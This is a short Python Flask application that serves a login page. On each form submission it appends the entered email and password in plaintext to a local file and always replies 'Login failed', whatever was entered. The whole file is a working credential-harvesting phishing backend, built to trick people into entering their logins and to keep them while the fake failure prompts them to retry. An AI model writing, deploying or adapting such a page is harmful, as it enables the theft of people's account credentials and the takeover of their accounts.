from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        with open("logs_readable.txt", "a") as f:
            f.write(f"{email} | {password}\n")

        return render_template("login.html", message="Login failed")

    return render_template("login.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001)
